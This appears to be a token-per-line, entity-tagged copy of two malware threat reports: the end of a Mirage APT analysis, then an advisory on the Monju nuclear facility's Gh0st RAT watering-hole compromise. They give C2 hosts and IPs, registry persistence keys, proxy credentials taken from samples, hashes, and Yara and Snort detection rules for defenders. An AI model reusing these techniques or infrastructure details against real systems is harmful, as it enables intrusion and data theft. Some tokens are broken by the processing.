contains
detailed
system
information
of
the
infected
system
to
give
the
C2
server
a
rough
profile
of
each
system
that
is
infected
and
that
is
calling
home
.

Figure
1
.

Phone-home
request
(
variant
1
)
.

The
payload
is
encoded
with
a
simple
cipher
to
mask
the
data
being
sent
to
the
C2
server
.

The
cipher
encodes
the
payload
by
adding
each
character
's
ASCII
value
by
its
offset
from
the
start
of
the
payload
.

Raw
values
M
i
Raw
hex
0x4d
0x69
0x72
0x61
0x67
0x65
Raw
decimal
101
77
Encoded
decimal
77
106
Encoded
hex
0x4d
0x6a
0x74
0x64
0x6b
0x6a
Encoded
values
M
j
105
106
114
116
97
100
d
k
103
107
rtagej
Table
1
.

Payload
encoding
.

The
initial
payload
starts
with
the
word
'
Mirage
'
,
which
in
its
encoded
state
is
'Mjtdkj
'
.

From
there
,
Mirage B_malware.infosteal
encodes
and
sends
the
MAC
address
,
CPU
information
,
system
name
and
username
in
the
initial
request
to
the
C2
server
.

If
the
C2
server
successfully
receives
the
request
,
then
it
responds
with
an
HTTP
response
code
'200
OK
'
.

The
word
'Mirage
'
appears
in
its
payload
,
followed
by
two
null
bytes
.

If
there
is
no
response
or
an
invalid
response
from
the
C2
server
,
the
infected
system
continues
to
send
its
initial
phone-home
request
at
regular
intervals
.

Figure
2
.

Decoded
payload
(
variant
1
)
.

If
the
infected
system
connects
successfully
to
the
C2
server
,
then
the
infected
system
continues
to
send
regular
check-in
updates
.

These
updates
are
transmitted
the
same
way
as
the
initial
phone-home
request
;
however
,
only
the
MAC
address
of
the
infected
system
is
sent
in
the
payload
.

Figure
3
.

Decoded
check-in
update
(
variant
1
)
.

The
second
variant
of
Mirage B_malware.infosteal
uses
HTTP
GET
requests
instead
of
HTTP
POST
requests
to
transmit
the
phone-home
requests
'
payload
.

This
evolved
variant
's
initial
phone-home
request
's
payload
is
contained
in
a
Base64-encoded
string
in
the
initial
request
.

The
decoded
Base64
payload
contains
a
second
level
of
encoding
that
has
several
variations
.

The
data
being
transmitted
in
the
encoded
string
contains
the
same
data
as
the
previous
variant
,
as
well
as
some
additional
data
.

One
change
is
the
text
at
the
beginning
of
the
phone-home
payload
.

Instead
of
the
word
'Mirage
'
used
in
earlier
variants
,
later
variants
use
the
phrase
'Neo
,
welcome
to
the
desert
of
the
real
'
,
a
quote
from
the
movie
The
Matrix
.

Figure
4
.

Sample
request
(
variant
2
)
.

The
CTU
research
team
has
seen
the
encoding
used
in
variant
2
in
other
malware
families
.

One
such
malware
family
is
Lingbo
,
which
uses
a
similar
encoding
algorithm
but
does
not
contain
some
of
the
major
characteristics
of
Mirage B_malware.infosteal
.

Samples
from
both
malware
families
have
included
strange
embedded
quotes
.

Instead
of
Mirage's B_malware.infosteal
quote
from
The
Matrix
,
Lingbo
contains
the
embedded
quote
'It
is
the
end
of
the
world
and
I
feel
Fine
'
,
from
the
REM
song
'It
's
the
end
of
the
world
.
'

Custom
versions
and
variants

The
CTU
research
team
identified
several
Mirage B_malware.infosteal
variants
that
had
unique
attributes
not
designed
for
widespread
targeting
.

These
custom
variants
were
designed
to
operate
under
specific
conditions
and
to
evade
common
system
defenses
.

CTU
researchers
also
found
several
samples
that
contained
debugging
information
,
possibly
from
early
versions
.

One
of
the
variants
was
seen
in
a
subset
of
samples
that
had
been
modified
specifically
for
the
environment
targeted
by
the
threat
actors
.

These
samples
had
been
configured
with
default
credentials
for
the
targeted
environment
's
web
proxy
servers
.

The
following
proxy
usernames
and
password
combinations
appear
in
the
samples
collected
by
the
CTU
research
team
:

a1
:
a1
pagmb
:
pa
quickheal
:
quickheal

In
the
debugging
versions
,
the
CTU
research
team
discovered
two
strings
that
identified
the
source
code
paths
from
which
the
samples
were
compiled
:
D:\....\MF-v1.2\Server\Debug\Server.pdb
(
MD5
hash
fa26f410d0133f4152ea78d-f3978c22 B_hash
)
E:\fox_1.2
20110307\MF-v1.2\Server\Release\MirageFox_Server.pdb
(
MD5
hash
1045e26819ff782015202838e2c609f7 B_hash
)
The
.pdb
file
extension
is
commonly
used
with
Microsoft
Visual
Studio
.

Its
use
in
these
debugging
versions
coincides
with
the
samples
for
Mirage B_malware.infosteal
,
which
were
written
using
Microsoft
Visual
C++
.

CTU
researchers
also
noted
that
the
original
name
of
the
trojan
used
in
the
path
is
MirageFox B_malware.infosteal
,
which
is
likely
the
name
used
by
the
threat
actors
.

This
information
leads
to
two
potential
conclusions
:

1
.
The
two
variants
of
MF-v1.2
,
the
debug
version
and
the
release
version
,
allow
the
threat
actors
to
customize
variants
.
CTU
researchers
have
already
seen
this
activity
.

2
.
The
use
of
different
drive
letters
but
similar
source
code
paths
may
indicate
that
the
threat
actors
are
keeping
a
repository
of
tools
on
a
central
file
server
for
shared
use
.

Identification
of
victims

From
May
to
the
date
of
this
publication
,
the
CTU
research
team
engaged
in
a
sinkholing
operation
.

During
the
operation
,
several
of
the
domains
formerly
used
as
part
of
the
C2
infrastructure
were
taken
over
,
and
all
activity
to
the
domains
was
logged
.

The
sink-holed
domains
were
no
longer
in
use
and
were
freely
available
for
registration
.

During
the
operation
,
CTU
researchers
were
able
to
identify
approximately
80
IP
addresses
regularly
communicating
to
the
sinkhole
.

After
analyzing
and
decoding
the
requests
,
CTU
researchers
discovered
that
a
subset
of
the
observed
systems
had
usernames
such
as
'admin
'
or
'owner
'
,
and
the
originating
IP
address
resolved
to
either
a
residence
or
an
antivirus
or
security
company
.

Because
these
requests
were
most
likely
from
behavioral
testing
on
the
malware
sample
,
the
CTU
research
team
filtered
these
connections
out
of
the
results
.

After
decoding
the
inbound
requests
,
the
CTU
research
team
identified
approximately
100-120
infected
systems
attempting
to
phone
home
.

The
majority
of
the
inbound
requests
came
from
Taiwan
or
the
Philippines
,
with
several
isolated
cases
in
Nigeria
,
Brazil
,
Israel
,
Canada
and
Egypt
.

Many
of
the
IP
addresses
originate
from
networks
owned
by
the
oil
company
,
energy
company
,
and
military
organization
.

Deeper
analysis
of
the
phone-home
requests
and
correlation
with
social
networking
sites
allowed
CTU
researchers
to
identify
a
specific
individual
infected
with
Mirage B_malware.infosteal
.

It
was
an
executive-level
finance
manager
of
the
Phillipine-based
oil
company
.

Figure
5
.

Sources
of
infected
hosts
.

Threat
actors
The
threat
actors
using
Mirage B_malware.infosteal
have
employed
several
tactics
to
attempt
to
hide
their
identities
and
their
primary
C2
servers
.

One
of
the
common
tactics
is
using
dynamic
domain
name
system
(
dDNS
)
domains
for
the
callbacks
to
the
C2
servers
.

dDNS
providers
(
e.g.
,
Dyndns.com B_url.normal
)
allow
anyone
to
register
for
a
free
third-level
domain
(
e.g.
,
Checkip.dyndns.org B_url.normal
)
and
require
only
a
valid
email
address
,
which
is
kept
private
.

When
investigating
the
DNS
addresses
of
the
C2
servers
,
CTU
researchers
identified
several
IP
addresses
of
hosting
companies
based
in
the
United
States
that
are
running
HTran
.

HTran
software
is
used
to
proxy
connections
from
one
system
to
another
.

In
the
past
,
it
has
been
used
to
disguise
the
true
C2
servers
used
by
malware
authors
.

In
the
CTU
research
team
's
2011
analysis
of
HTran
,
the
software
's
author
was
identified
as
a
member
of
the
Chinese
hacker
group
HUC
,
the
Honker
Union
of
China
.

Despite
efforts
to
operate
anonymously
,
there
were
several
clues
that
pointed
to
the
true
identities
of
the
attackers
.

During
an
analysis
of
the
phone-home
activity
,
CTU
researchers
identified
four
unique
second-level
domains
that
were
not
connected
to
a
dDNS
provider
.

Two
of
these
domains
shared
a
common
owner
's
email
address
,
and
two
were
previously
flagged
for
suspicious
activity
.

nie
min
C2
domain
name
Owner
name
Owner
email
Adobesuit.com B_url.cncsvr
antivirusbar.org B_url.cncsvr
white
jacks
Echosky.biz B_url.cncsvr
India-videoer.com B_url.cncsvr
india
videoer
king@hotmail.com
Asia-online.us B_url.cncsvr
dnsjacks@yahoo.com
dnsjacks@yahoo.com
tawnya
grilth
jeno_1980@hotmail.com
bkpathak
king_public@hotmail.com
/
kings@hotmail.com
Table
2
.

Unique
second-level
domains
.

CTU
researchers
correlated
86
%
of
the
IP
addresses
the
dDNS
domains
used
in
the
phone-home
request
to
IP
addresses
of
subdomains
belonging
to
domains
owned
by
dnsjacks@yahoo.com
.

Of
the
remaining
14
%
that
were
not
directly
associated
,
CTU
researchers
correlated
10
%
to
IP
ranges
that
resolved
to
subdomains
owned
by
dnsjacks@yahoo.com
.

Figure
6
.

Analysis
of
IP
addresses
.

(
Source
:
Dell
SecureWorks
)
This
link
between
the
IP
addresses
and
the
subdomains
indicates
that
dnsjacks@yahoo.com
owns
the
dDNS
domains
.

Using
historical
DNS
records
,
CTU
researchers
were
able
to
map
each
of
the
dDNS
domains
to
a
subdomain
of
a
domain
owned
by
dnsjacks@yahoo.com
.

Figure
7
.

Details
of
IP
range
.

In
the
samples
CTU
researchers
analyzed
,
the
other
domains
associated
with
the
phone-home
activity
are
asia-online.us
,
india-videoer.com
and
Echosky.biz
.

The
CTU
research
team
previously
flagged
these
domains
in
the
HTran
investigation
and
later
in
the
Sin
Digoo
analysis
.

The
analysis
of
the
Sin
Digoo
affair
indicated
that
jeno_1980@hotmail.com
and
king@hotmail.com
were
connected
.

From
the
data
the
CTU
research
team
has
collected
,
indications
point
to
dnsjacks@yahoo.com
being
either
another
alias
or
an
associate
of
the
actor
referenced
in
the
HTran
and
Sin
Digoo
analyses
.

Figure
8
.

A
common
phone
number
was
found
to
link
india-videoer.com B_url.unknown
and
asia-online.us B_url.unknown
Conclusion
Mirage B_malware.infosteal
represents
only
one
small
piece
of
malware
involved
in
an
ongoing
worldwide
campaign
.

Over
the
past
few
years
,
these
campaigns
have
become
extremely
successful
,
and
a
great
deal
of
intellectual
property
and
company
secrets
has
been
stolen
from
the
targeted
companies
.

For
companies
in
the
targeted
industries
,
it
is
important
to
have
a
strong
perimeter
security
line
in
place
.

Using
active
intrusion
detection
and
prevention
systems
as
well
as
DNS
monitoring
for
malicious
domains
is
essential
to
detecting
this
activity
.

Companies
that
use
the
Yara B_malware.unknown
malware
identification
and
classification
tool
for
scanning
local
systems
can
use
the
rules
provided
in
the
appendix
to
search
for
potential
infections
.

Traditionally
,
the
success
of
botnets
created
by
threat
actor
groups
has
been
measured
by
the
quantity
of
infected
systems
and
the
difficulty
to
defend
against
in
the
long
term
.

These
targeted
attacks
show
that
a
successful
campaign
requires
only
a
small
quantity
of
infected
systems
to
accomplish
the
attackers
'
objectives
and
to
yield
extremely
powerful
results
.

Appendix
Yara B_maware.unknown
rules
rule
Mirage_APT_Backdoor
:
APT
Mirage
Backdoor
Rat
MirageRat
{
meta
:
author
=
'Silas
Cutler
(
SCutler
@
SecureWorks.-
com
)
'
version
=
'1.0
'
description
=
'Malware
related
to
APT
cam-
paign
'
type
=
'APT
Trojan
/
RAT
/
Backdoor
'
strings
:
$
a1
=
'welcome
to
the
desert
of
the
real
'
$
a2
=
'Mirage
'
$
b
=
'Encoding
:
gzip
'
$
c
=
/\/
[
A-Za-z
]
*\
?
hl=en/
condition
:
(
(
$
a1
or
$
a2
)
or
$
b
)
and
$
c
}
MD5
hashes
5efd0d7f52890291599c8562e8ea92db B_hash
eacd03ee55ea7d22b45762c82ae1c0e5 B_hash
ce1cdc9c95a6808945f54164b2e4d9d2 B_hash
5326e4fe9fd10e37d46e81c0f6bbf29a B_hash
b2e821828df59c734c1cc379ef7f3122 B_hash
875877eedcd9f2d60bf63937fe22073d B_hash
02d77cdaa808ded64d09eea732a586cc B_hash
18a5c6e92b962bc6512486db94bb17a7 B_hash
32b33321290ac8011aa218da554b8fa5 B_hash
f41896e9f77855842380fd9ed795bc64 B_hash
407c291cd5c73da680fa9af9ec017fff B_hash
7adb0f22468c10901bd280b2d8a154b0 B_hash
abac650ab39c0dd074310710081d715d B_hash
c9e49c504d5ca953c858d29b7a2acb9d B_hash
aaa9aae486ee7342d29a0a2f9b0ca205 B_hash
7ad79f9a0efde6f4673585e400f29f18 B_hash
f51fbafc652e10a9ce13795d4cb2d449 B_hash
a748ff9663b2d39a35e4c073b73cd7f6 B_hash
e7d5ac11903c0217a999a79bc87182d2 B_hash
1b918c8a40dc4a66430cfec7dabeb7f3 B_hash
c72d7794dc7f2eda6b44b934fe8fff1c B_hash
ad2dda9241cd6c0e879ab665d77ce13c B_hash
ccf34d2ba81de856af8167e73d0c8b69 B_hash
ebe7699033424b9ef444364bd23ba665 B_hash
7349c7908a672de885fdf9f9cc4547b5 B_hash
eacd14ce8414911546cb027a8cb2fecd B_hash
4b9723a4060838114e53d1df3fa2537a B_hash
070ef82a0bded089b6f996a392ca7b9a B_hash
286f7b377f5d0ca3505ed1ba6601c947 B_hash
4d74a83e2f623f17e17eb95736dc587b B_hash
a4b9bfc5aa5e37cc613112b9a9dcdb3e B_hash
fb17ffc7495880a7c19df0ebe5c97ad7 B_hash
e29ab99be392bb7012f516a2dbfdc00c B_hash
8caf2a96e4d7bb83156c260ccc8f47e7 B_hash
a4ff66224a0967763e1d079c99482577 B_hash
f0b93bf7273cbeaed69ed55b5169daf7 B_hash
3be6fea2bf35c3c3be860622c68ff369 B_hash
5fa26f410d0133f4152ea78df3978c22 B_hash
3d10e68dec16b1a4bf949e3e403f2dda B_hash
5c371a6dfb45f188fe8e6da4fee9300d B_hash
9ff3a9ef192453ecec26cf567c579bff B_hash
65445b138d80954cc912a6e43fe5b66d B_hash
685805936d8744225f8c11965202de8e B_hash
80e978d0eea713812f1dd6b4e9b7daf2 B_hash
921c724ccb04b9f672b294ffff83ce7b B_hash
072877b961e31e8792a296c63b9c7b56 B_hash
1a8bc862ceaa7e05189345065145842a B_hash
6794cc6f5e463ee7432b9e718d8c1b8e B_hash
fdb949112cc72c68fc7c1ea0c65344bc B_hash
f4a6114fce22eb18b0ccf19cfa68ddba B_hash
1045e26819ff782015202838e2c609f7 B_hash
5640beb540bef2e97ec4366713d533b8 B_hash
0f93d28964b440c241ca126a7f94dae2 B_hash
075df4723073ff08cd3e90d2b1f11722 B_hash
240627a306f32483378e44ff13e12169 B_hash
5f2a4d865e6e94f7f15571faab5128d6 B_hash
3bfa7b806ff540cc1c264ec75048fbc4 B_hash
05a02e08cce99d3821574d8612f757fd B_hash
d60cfe03bce8647cce723991e2cd2f8c B_hash
6ed270da7450945a3a5a05eda8312732 B_hash
a1083968b78c081135268b6e4e12b1e5 B_hash
0fce05e2cea6bd9c217373f2ab962d82 B_hash
85ef19fab3951d4dd56e42b5a9ccdeea B_hash
422f1ffe7e5bda7062f005be92fba36e B_hash
346aa61b5739e616482a1bc8bb548871 B_hash
c2661e45ec2198b04b29ec3fd1e120b2 B_hash
e04e5eb4aefeb326246d7f41d1b50759 B_hash
eb1aa241b4a482ac44b27ce38eabccb7 B_hash
418fb9ba2a61bccab3e54ebe0698c4b6 B_hash
590e68aaaa5c2353b7288f64cc87d9bb B_hash
1f9894e730c0f5ba085baae409aa963a B_hash
11b76423f450ba610f073e7522eeb56b B_hash
54d37fb1f624c798f0b400b4f50f3635 B_hash
7fda0451e4d320cc34efcaaabedd6824 B_hash
84fc624f9f5f8de6980497058db1e8e1 B_hash
964eec615f977b05bc87943ce0942cf9 B_hash
5069057b799636c012eec38147fb96e6 B_hash
a4a1670c537861f7d5b0db115a7aa5fa B_hash
00b9619613bc82f5fe117c2ca394a328 B_hash
2219bef789ff73efc0a01f87be03188d B_hash
TLP
:
WHITE

Context
Threat
Intelligence
Threat
Advisory
The
Monju
Incident

Context
Ref
.

TA10009
Author
Context
Threat
Intelligence
(
CTI
)
Date
Tel
Fax
Email
27/01/2014
+44
(
0
)
20
7537
7515
+44
(
0
)
20
7537
1071
threat@contextis.co.uk

TLP
:
WHITE
Contents
1
Distribution
2
Executive
Summary
3
The
Monju
Incident
3.1
Infection
Vector
3.2
Malware
3.2.1
Overview
3.2.2
Detection
4
Appendix
A
-
File
Metadata
34556689

1
Distribution
Context
Information
Security
distribute
Context
Threat
Intelligence
(
CTI
)
reporting
under
the
Traffic
Light
Protocol
(
TLP
)
[
1
]
,
a
method
of
classifying
a
document
in
order
to
promote
the
distribution
of
sensitive
information
between
individuals
,
organisations
or
communities
in
a
controlled
and
trusted
way
,
based
on
the
originator
's
wishes
.

The
various
levels
of
the
TLP
are
represented
by
the
following
colours
:

RED
-
Personal
;
for
named
recipients
only

Sources
may
use
TLP
:
RED
when
information
can
not
be
effectively
acted
upon
by
additional
parties
,
and
could
lead
to
impacts
on
a
party
's
privacy
,
reputation
,
or
operations
if
misused
.

Recipients
may
not
share
TLP
:
RED
information
with
any
parties
outside
of
the
specific
exchange
,
meeting
,
or
conversation
in
which
it
is
originally
disclosed
.
TLP
:
RED
information
will
be
passed
verbally
or
in
person
.

AMBER
-
Limited
Distribution
Sources
may
use
TLP
:
AMBER
when
information
requires
support
to
be
effectively
acted
upon
,
but
carries
risks
to
privacy
,
reputation
,
or
operations
if
shared
outside
of
the
organisations
involved
.

Recipients
may
only
share
TLP
:
AMBER
information
with
members
of
their
own
organisation
who
need
to
know
,
and
only
as
widely
as
necessary
to
act
on
that
information
.

GREEN
-
Community
Wide

Sources
may
use
TLP
:
GREEN
when
information
is
useful
for
the
awareness
of
all
participating
organisations
as
well
as
with
peers
within
the
broader
community
or
sector
.

Recipients
may
share
TLP
:
GREEN
information
with
peers
and
partner
organisations
within
their
sector
or
community
,
but
not
via
publicly
accessible
channels
such
as
publication
or
posting
publicly
on
the
Internet
.

WHITE
-
Unlimited
Distribution
Sources
may
use
TLP
:
WHITE
when
information
carries
minimal
or
no
foreseeable
risk
of
misuse
,
in
accordance
with
applicable
rules
and
procedures
for
public
release
.

Subject
to
standard
copyright
rules
,
TLP
:
WHITE
information
may
be
distributed
freely
,
without
restriction
.

2
Executive
Summary
On
2nd
January
2014
a
Systems
Administrator
at
the
Monju
fast
breeder
reactor
facility
in
Japan
noticed
suspicious
connections
emanating
from
a
machine
in
the
control
room
,
coinciding
with
what
was
a
seemingly
routine
software
update
to
a
free
media
player
.

Among
other
items
,
staff
training
documents
and
more
than
40,000
emails
were
stored
on
the
machine
and
thought
to
be
harvested
by
the
attacker
.
The
Japanese
Atomic
Energy
Agency
is
investigating
further
.

The
attack
appears
to
have
been
the
result
of
the
attackers
having
compromised
the
'
GOM
Player
'
update
server
and
having
it
act
as
a
'
watering
hole
'
,
meaning
that
machines
which
access
the
site
are
delivered
malware
.

Gom
Player
originates
in
South
Korea
and
in
some
parts
of
Asia
it
is
a
popular
alternative
to
Windows
Media
Player
.

It
is
unclear
whether
every
machine
trying
to
download
an
update
received
this
malware
or
whether
only
machines
which
fitted
a
certain
profile
were
infected
.

Technical
analysis
of
the
implant
on
the
compromised
machine
has
shown
it
to
be
a
variant
of
a
Trojan
which
has
been
in
the
wild
for
some
years
now
and
continues
to
be
effective
.

The
'Gh0st
RAT
'
has
been
used
extensively
in
attacks
linked
to
the
Chinese
state
,
though
it
is
important
to
remember
that
the
code
is
publicly
available
and
can
be
modified
and
used
by
anyone
.

The
targeting
of
a
Japanese
nuclear
facility
however
,
is
consistent
with
Chinese
state
intelligence
requirements
.

If
this
is
the
work
of
a
Chinese
group
then
we
feel
the
targeting
may
go
much
further
than
the
Civil
Nuclear
sector
and
thus
be
of
interest
to
the
wider
Energy
Sector
and
industry
as
a
whole
.

In
order
to
inform
the
Energy
Sector
and
beyond
about
this
attack
,
we
have
compiled
a
technical
summary
of
the
attack
and
have
provided
a
number
of
Indicators
Of
Compromise
(
IOCs
)
which
can
be
used
to
aid
detection
.

It
is
likely
that
the
attackers
would
redeploy
their
implant
against
other
targets
,
albeit
with
a
delivery
mechanism
more
tailored
to
the
location
of
the
intended
victims
.

3
The
Monju
Incident
3.1
Infection
Vector
Based
on
open
source
reporting
,
it
appears
that
the
intrusion
took
place
via
the
compromise
of
the
GOM
Player
update
server
(
app.gomlab.com B_url.normal
)
,
where
attackers
may
have
gained
entry
via
a
PHP-based
webshell
,
hidden
within
an
image
,
present
on
the
host
since
October
2011
[
2
]
.

The
observed
malicious
activity
relates
to
the
modification
of
a
file
that
controls
GOM
Player
updates
,
spanning
the
date
range
27th
December
2013
to
16th
January
2014
,
during
which
time
these
alterations
are
reported
to
have
only
manifested
themselves
for
visitors
on
certain
IP
ranges
;
evidence
supporting
this
claim
has
not
yet
been
made
public
.

If
this
was
indeed
the
case
,
then
the
nature
of
this
attack
is
certainly
more
targeted
than
one
that
would
cover
the
entire
userbase
of
the
GOM
Player
product
,
with
victims
comprising
of
the
Japanese
Government
in
addition
to
those
at
the
Monju
nuclear
facility
.

The
modified
file
redirected
the
GOM
Player
update
process
to
another
compromised
server
(
www.fudousankaitori.jp B_url.distribute
(
203.189.101.35 B_ip.distribute
)
)
,
where
a
file
containing
both
the
legitimate
update
and
the
malware
was
deliver
to
the
victim
.

A
diagram
illustrating
the
modified
flow
of
the
GOM
Player
update
process
which
led
to
the
compromise

Victim
app.gomlab.com B_url.normal
www.fudousankaitori.jp B_url.distribute
GOM
PlayerUpdate
RequestModified
Update
URL
testqweasd.tk B_malware.cncsvr
GOM
UpdateDownload
RequestGOM
Player
and
Malware
1
2
Malware
Command
And
Contro
l3
KeyAttacker
Infrastructure
Compromised
Server

3.2
Malware
3.2.1
Overview
Deployed
to
the
system
via
a
compressed
bundle
containing
the
official
GOM
Player
setup
binary
and
a
self-extracting
RAR
archive
containing
the
malicious
files
,
the
malware
consists
of
a
number
of
individual
pieces
.

Upon
extraction
from
the
RAR
archive
,
the
installer
component
(
0ae82fd94836815a1e8d284ccb75109d B_hash
)
is
automatically
launched
alongside
the
GOM
Player
update
,
distracting
victims
from
the
malicious
activity
taking
place
.

The
installer
component
is
referred
to
by
the
author
as
'
miansha
'
which
,
according
to
an
East
Asia
Cyber
Threat
Intelligence
Researcher
,
is
likely
(
)
,
a
phrase
commonly
used
by
People
's
Republic
of
China
(
PRC
)
hackers
to
mean
'anti
Antivirus
detection
'
or
'Antivirus
avoidance
'
;
Symantec
[
3
]
have
named
the
detection
for
this
code
'
Backdoor.Miancha B_malware.backdoor
'
,
where
Miǎnchá
(
免查
,
likely
shorthand
for
免杀查
)
similarly
means
'Antivirus
avoidance
'
.

The
installer
is
responsible
for
the
malware
persistence
mechanism
,
adding
entries
to
the
registry
in
the
following
locations
,
depending
on
Windows
Version
:
Miancha B_malware.backdoor
Persistence
Registry
Keys
Windows
Vista
and
later
HKEY_USERS\.default\Software\Classes\CLSID\
{
ECD4FC4D-5213-11D0-B792-00A0C90312E1
}
\InProcServer32\
@
=
expand:'C:\WINDOWS\temp\install.ocx
'
Prior
to
Windows
Vista
HKEY_USERS\.default\Software\Classes\CLSID\
{
B12AE898-D056-4378-A844-6D393FE37956
}
\InProcServer32\
@
=
expand:'C:\WINDOWS\temp\install.ocx
'

The
installer
will
also
determine
the
system
architecture
(
32
-
or
64
-
bit
)
and
then
deobfuscate
the
relevant
loader
DLL
to
the
path
'
C:\Windows\temp\install.ocx
'
,
ensuring
the
malware
is
launched
on
system
start-up
.

Oddly
,
this
file
is
padded
with
null
bytes
,
resulting
in
a
25
megabyte
file
.

The
deployment
chain
of
the
Miancha B_malware.backdoor
Gh0st I
variant I

Repackaged
UpdateGoMPLAYERJPSETUP.EXE
(
a9225e059d9dace1b259bceec7f48dae B_hash
)
Real
GOM
Player
InstallerGOMPLAYERJPSETUP_JP.EXE
(
1ff3b3628e40f0215afacf482ba17782 B_hash
)
Self-extracting
RAR
Archive
containing
MalwareGOMPLAYERBETASETUP_JP.exe B_malware.drop
(
db79a93448acac8786581858f3edc36a B_hash
)
Malicious B_malware.drop
Installerinstall.exe I
(
0ae82fd94836815a1e8d284ccb75109d B_hash
)
Obfuscated
Implant
Codeinstructions.pdf
(
569071c45f47b7fb7a75f30bc07d5739 B_hash
)
instructions64.pdf
(
55474f8e26f2b6fc3b5d78ce9a77b0b0 B_hash
)
Obfuscated
Malware
Loadersdll.tmp
(
d5548e1913950a42a04debcac4222bd2 B_hash
)
dll64.tmp
(
01f7b465242237bd3d31d39767aa68e0 B_hash
)

The
main
implant
code
is
stored
in
files
named
instructions.pdf
and
instructions64.pdf
;
not
PDF
documents
but
instead
DLLs
obfuscated
with
a
one-byte
XOR
with
0x14
,
similar
to
the
malware
loader
DLLs
.

The
loader
,
referred
to
by
the
malware
author
as
壳
(
shell
)
,
reads
and
deobfuscates
the
main
implant
code
which
then
communicates
with
the
attacker-controlled
server
at
testqweasd.tk B_url.cncsvr
(
211.43.220.89 B_ip.cncsvr
)
on
TCP
port
443
.

The
main
implant
code
is
referred
to
as
白加黑
(
'Black
on
White
'
)
,
a
term
used
in
the
PRC
hacking
community
to
denote
the
act
of
Antivirus
avoidance
through
the
loading
of
malicious
'black
'
code
via
non-malicious
or
trusted
'white
'
code
.

This
is
a
practice
recently
illustrated
through
the
deployment
of
the
PlugX B_malware.backdoor
trojan
,
utilising
DLL
load
order
hijacking
alongside
a
signed
(
trusted
)
executable
.

Analysis
of
this
malware
revealed
it
to
be
a
variant
of
the
Gh0st
RAT
,
often
used
by
Chinese
actors
(
including
those
who
are
state-motivated
or
directly
state-sponsored
)
.

This
specific
variant
shows
similarities
to
that
used
during
the
VOHO
campaign
[
4
]
,
where
Gh0st
RAT
was
spread
via
watering
hole
attacks
utilising
vulnerable
websites
belonging
to
financial
services
and
technology
companies
.

Specifically
,
the
initial
five
bytes
of
the
communications
(
often
used
to
denote
a
campaign
or
victim
)
are
'HTTPS
'
,
amended
from
the
original
'Gh0st
'
;
the
same
as
the
traffic
produced
by
the
VOHO
Gh0st
variant
.

In
addition
to
delivering
system-specific
details
back
to
the
attacker
,
Gh0st
RAT
provides
the
capability
to
deploy
additional
malware
,
enabling
the
harvesting
of
sensitive
data
and
enabling
the
further
propagation
throughout
the
infected
network
.

3.2.2
Detection
To
enable
rapid
response
,
the
following
Snort
signature
can
be
deployed
:
alert
tcp
$
HOME_NET
any
-
>
$
EXTERNAL_NET
53,80,443,1080
(
msg
:
'
gh0st
RAT
'HTTPS
'
variant
(
aka
Backdoor.Miancha B_malware.backdoor
)
'
;
flow
:
established
,
to_server
;
content
:
'
HTTPS
'
;
depth:5
;
rawbytes
;
classtype
:
trojan-activity
;
sid
:
xxx
;
rev:1
;
)
Additionally
,
the
following
Yara
signature
should
identify
both
encoded
payloads
and
the
active
implant
in
memory
:
rule
Trojan_W32_Gh0stMiancha_1_0_0 B_malware.backdoor
{
strings
:
$
0x
=
{
57
5b
5a
5a
51
57
40
34
31
67
2e
31
70
34
5c
40
40
44
3b
25
3a
19
1e
5c
7b
67
60
2e
34
31
67
2e
31
70
19
1e
55
77
77
71
64
60
2e
34
3e
3b
3e
19
1e
57
7b
7a
60
71
7a
60
39
40
6d
64
71
2e
34
60
71
6c
60
3b
7c
60
79
78
19
1e
44
66
7b
6c
6d
39
57
7b
7a
7a
71
77
60
7d
7b
7a
2e
34
5f
71
71
64
39
55
78
7d
62
71
19
1e
57
7b
7a
60
71
7a
60
39
78
71
7a
73
60
7c
2e
34
24
19
1e
19
1e
}
$
1
=
{
5c
e7
99
bd
e5
8a
a0
e9
bb
91
5c
}
$
1x
=
{
48
f3
8d
a9
f1
9e
b4
fd
af
85
48
}
$
2
=
'DllCanLoadNow
'
$
2x
=
{
50
78
78
57
75
7a
58
7b
75
70
5a
7b
63
}
$
3x
=
{
5a
61
79
76
71
66
34
7b
72
34
67
61
76
7f
71
6d
67
2e
34
31
70
}
$
4
=
'JXNcc2hlbGxcb3Blblxjb21tYW5k
'
$
4x
=
{
5e
4c
5a
77
77
26
7c
78
76
53
6c
77
76
27
56
78
76
78
6c
7e
76
26
25
60
4d
43
21
7f
}
$
5
=
'SEFSRFdBUkVcREVTQ1JJUFRJT05cU3lzdGVtXENlbnRyYWxQcm9jZXNzb3JcMA==
'
$
5x
=
{
47
51
52
47
46
52
70
56
41
7f
42
77
46
51
42
40
45
25
5e
5e
41
52
46
5e
40
24
21
77
41
27
78
6e
70
53
42
60
4c
51
5a
78
76
7a
46
6d
4d
43
6c
45
77
79
2d
7e
4e
4c
5a
6e
76
27
5e
77
59
55
29
29
}
$
6
=
'C
:
\\Users\\why\\
'
$
6x
=
{
57
2e
48
41
67
71
66
67
48
63
7c
6d
48
}
$
7
=
'g
:
\\ykcx\\
'
$
7x
=
{
73
2E
48
6D
7F
77
6C
48
}
$
8
=
'
(
miansha
)
'
$
8x
=
{
3C
79
7D
75
7A
67
7C
75
3D
}
$
9
=
'server
(
\xE5\xA3\xB3
)
'
$
9x
=
{
7C
2E
48
26
24
25
27
3A
25
25
3A
26
21
48
67
71
66
62
71
66
3C
F1
B7
A7
3D
48
46
71
78
71
75
67
71
48
67
71
66
62
71
66
3A
64
70
76
}
$
cfgDecode
=
{
8a
?
?

?
?

80
c2
7a
80
f2
19
88
?
?

?
?

41
3b
ce
7c
?
?
}

condition
:
any
of
them
}

4
Appendix
A
–
File
Metadata
Gh0stMiancha B_malware.backdoor
Installer
MD5
SHA1
SHA256
0ae82fd94836815a1e8d284ccb75109d B_hash
bcba2a4d55d860f0bca3b9f80a5deb2dd69f000c
b2f9e2f7c07235a6ea03e90ba591f0a43d38d8ff8ee6583473b6fbb63831619d
Size
(
bytes
)
13314
Compile
Time
2013-11-22
12:19:48
UTC
In-the-wild
Filenames
install.exe B_malware.drop
PDB
String
g
:
\ykcx\install(miansha)\Release\install.pdb
Obfuscated
TrojanLoader
:
W32
/
Gh0stMiancha B_malware.backdoor
MD5
SHA1
SHA256
d5548e1913950a42a04debcac4222bd2 B_hash
ac48bc2deefd30dad762a23e85409a7eec48b723
3d43f7fab3c8f574e2790c2d97f85fa87f0d53e412c995462e53348b4fc34b74
Size
(
bytes
)
Compile
Time
10299
N/A
In-the-wild
Filenames
dll.tmp
TrojanLoader
:
W32
/
Gh0stMiancha B_malware.backdoor
MD5
SHA1
SHA256
